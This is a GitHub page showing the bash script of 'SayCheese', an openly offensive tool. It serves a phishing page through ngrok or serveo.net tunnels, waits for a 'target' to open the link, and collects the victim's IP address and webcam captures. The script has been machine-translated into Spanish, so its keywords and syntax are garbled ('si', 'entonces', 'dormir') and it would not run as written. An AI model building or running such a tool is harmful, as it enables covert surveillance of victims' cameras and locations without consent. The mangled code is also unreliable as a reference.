
Con la guía Hello World, comenzará una rama, escribirá comentarios y abrirá una solicitud de extracción.


 Problemas decódigo11Solicitudesdeextracción2Proyectos0WikiSecurityPulseCommunity       
saycheese /saycheese.sh
@thelinuxchoice thelinuxchoice Agregar archivos a través de la carga
c3ba75c
on 28 Apr
244 líneas (170 sloc)  6.17 KB
 
#! / bin / bash
# SayCheese v1.0
# codificado por: github.com/thelinuxchoice/saycheese
# Si usa alguna parte de este código, dándome los créditos. ¡Lee el Lincense!

trap  ' printf "\ n"; stop ' 2

banner () {


printf  " \ e [1; 92m ____ \ e [0m \ e [1; 77m ____ _ \ e [0m \ n "
printf  " \ e [1; 92m / ___ | __ _ _ _ \ e [0m \ e [1; 77m / ___ | | __ ___ ___ ___ ___ \ e [0m \ n "
printf  " \ e [1; 92m \ ___ \ / _ \` | | | \ e [0m \ e [1; 77m | | | '_ \ / _ \ / _ \ / __ | / _ \ \ e [0m \ n "
printf  " \ e [1; 92m ___) | (_ | | | _ | | \ e [0m \ e [1; 77m | ___ | | | | __ / __ / \ __ \ __ / \ e [0m \ n "
printf  " \ e [1; 92m | ____ / \ __, _ | \ __, | \ e [0m \ e [1; 77m \ ____ | _ | | _ | \ ___ | \ ___ || ___ / \ ___ | \ e [0m \ n "
printf  " \ e [1; 92m | ___ / \ e [0m \ n "

printf  " \ e [1; 77m v1.0 codificado por github.com/thelinuxchoice/saycheese\e[0m \ n "

printf  " \ n "


}

stop () {

checkngrok = $ ( ps aux | grep -o " ngrok "  | head -n1 )
checkphp = $ ( ps aux | grep -o " php "  | head -n1 )
chequessh = $ ( ps aux | grep -o " ssh "  | head -n1 )
if [[ $ checkngrok  ==  * ' ngrok ' * ]] ;  entonces
pkill -f -2 ngrok > / dev / null 2> & 1
killall -2 ngrok > / dev / null 2> & 1
fi

if [[ $ checkphp  ==  * ' php ' * ]] ;  entonces
killall -2 php > / dev / null 2> & 1
fi
if [[ $ chequessh  ==  * ' ssh ' * ]] ;  entonces
killall -2 ssh > / dev / null 2> & 1
fi
salida 1

}

dependencias () {


comando -v php > / dev / null 2> & 1  || { echo  > & 2  " Necesito php pero no está instalado. Instalarlo. Abortar " .  salida 1 ; }
 


}

catch_ip () {

ip = $ ( grep -a ' IP: ' ip.txt | cut -d "  " -f2 | tr -d ' \ r ' )
IFS = $ ' \ n '
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] IP: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip

cat ip.txt >> saved.ip.txt


}

checkfound () {

printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Objetivos en espera, \ e [0m \ e [1; 77m Presione Ctrl + C para salir ... \ e [0m \ n "
mientras [ verdadero ] ;  hacer


si [[ -e  " ip.txt " ]] ;  entonces
printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] ¡Target abrió el enlace! \ n "
catch_ip
rm -rf ip.txt

fi

dormir 0.5

si [[ -e  " Log.log " ]] ;  entonces
printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] ¡Se recibió el archivo de leva! \ e [0m \ n "
rm -rf Log.log
fi
dormir 0.5

hecho 

}


servidor () {

comando -v ssh > / dev / null 2> & 1  || { echo  > & 2  " Necesito ssh pero no está instalado. Instalarlo. Abortar " .  salida 1 ; }

printf  " \ e [1; 77m [\ e [0m \ e [1; 93m + \ e [0m \ e [1; 77m] Iniciando Serveo ... \ e [0m \ n "

if [[ $ checkphp  ==  * ' php ' * ]] ;  entonces
killall -2 php > / dev / null 2> & 1
fi

if [[ $ subdomain_resp  ==  true ]] ;  entonces

$ ( que sh ) -c ' ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R ' $ subdominio ' : 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &

dormir 8
más
$ ( que sh ) -c ' ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &

dormir 8
fi
printf  " \ e [1; 77m [\ e [0m \ e [1; 33m + \ e [0m \ e [1; 77m] Iniciando servidor php ... (localhost: 3333) \ e [0m \ n "
fusor -k 3333 / tcp > / dev / null 2> & 1
php -S localhost: 3333 > / dev / null 2> & 1  &
dormir 3
send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )
printf  ' \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] Enlace directo: \ e [0m \ e [1; 77m% s \ n '  $ send_link

}


payload_ngrok () {

link = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
sed ' s + forwarding_link + ' $ link ' + g ' saycheese.html > index2.html
sed ' s + forwarding_link + ' $ link ' + g ' template.php > index.php


}

ngrok_server () {


si [[ -e ngrok]] ;  entonces
echo  " "
más
comando -v descomprimir > / dev / null 2> & 1  || { echo  > & 2  " Necesito descomprimir pero no está instalado. Instalarlo. Abortar " .  salida 1 ; }
comando -v wget > / dev / null 2> & 1  || { echo  > & 2  " Necesito wget pero no está instalado. Instalarlo. Abortar " .  salida 1 ; }
printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Descargando Ngrok ... \ n "
arch = $ ( uname -a | grep -o ' arm '  | head -n1 )
arch2 = $ ( uname -a | grep -o ' Android '  | head -n1 )
si [[ $ arch  ==  * ' brazo ' * ]] || [[ $ arch2  ==  * ' Android ' * ]] ;  entonces
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > / dev / null 2> & 1

if [[ -e ngrok-stable-linux-arm.zip]] ;  entonces
descomprima ngrok-stable-linux-arm.zip > / dev / null 2> & 1
chmod + x ngrok
rm -rf ngrok-stable-linux-arm.zip
más
printf  " \ e [1; 93m [!] Error de descarga ... Termux, ejecute: \ e [0m \ e [1; 77m pkg install wget \ e [0m \ n "
salida 1
fi

más
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > / dev / null 2> & 1 
if [[ -e ngrok-stable-linux-386.zip]] ;  entonces
descomprima ngrok-stable-linux-386.zip > / dev / null 2> & 1
chmod + x ngrok
rm -rf ngrok-stable-linux-386.zip
más
printf  " \ e [1; 93m [!] Error de descarga ... \ e [0m \ n "
salida 1
fi
fi
fi

printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Iniciando el servidor php ... \ n "
php -S 127.0.0.1:3333 > / dev / null 2> & 1  & 
dormir 2
printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Iniciando el servidor ngrok ... \ n "
./ngrok http 3333 > / dev / null 2> & 1  &
dormir 10

link = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Enlace directo: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ enlace

payload_ngrok
chequeado
}

inicio1 () {
si [[ -e sendlink]] ;  entonces
rm -rf sendlink
fi

printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m01 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Serveo.net \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m02 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Ngrok \ e [0m \ n "
default_option_server = " 1 "
leer -p $ ' \ n \ e [1; 92m [ \ e [0m \ e [1; 77m + \ e [0m \ e [1; 92m] Elija una opción de reenvío de puertos: \ e [0m ' servidor_opciones
option_server = " $ {option_server : - $ {default_option_server} } "
if [[ $ opción_servidor  -eq 1]] ;  entonces

comando -v php > / dev / null 2> & 1  || { echo  > & 2  " Necesito ssh pero no está instalado. Instalarlo. Abortar " .  salida 1 ; }
comienzo

elif [[ $ opción_servidor  -eq 2]] ;  entonces
ngrok_server
más
printf  " \ e [1; 93m [!] ¡Opción no válida! \ e [0m \ n "
dormir 1
claro
inicio1
fi

}


carga útil () {

send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )

sed ' s + forwarding_link + ' $ send_link ' + g ' saycheese.html > index2.html
sed ' s + forwarding_link + ' $ send_link ' + g ' template.php > index.php


}

inicio () {

default_choose_sub = " Y "
default_subdomain = " saycheese $ RANDOM "

printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] ¿Elegir subdominio? (Predeterminado: \ e [0m \ e [1; 77m [S / n] \ e [0m \ e [1; 33m): \ e [0m '
leer elegir_sub
choose_sub = " $ {choose_sub : - $ {default_choose_sub} } "
si [[ $ choose_sub  ==  " Y "  ||  $ choose_sub  ==  " y "  ||  $ choose_sub  ==  " Sí "  ||  $ choose_sub  ==  " sí " ]] ;  entonces
subdominio_resp = verdadero
printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] Subdominio: (Predeterminado: \ e [0m \ e [1; 77m% s \ e [ 0m \ e [1; 33m): \ e [0m '  $ subdominio $ default
leer subdominio
subdominio = " $ {subdominio : - $ {default_subdomain} } "
fi

servidor
carga útil
chequeado

}

bandera
dependencias
inicio1
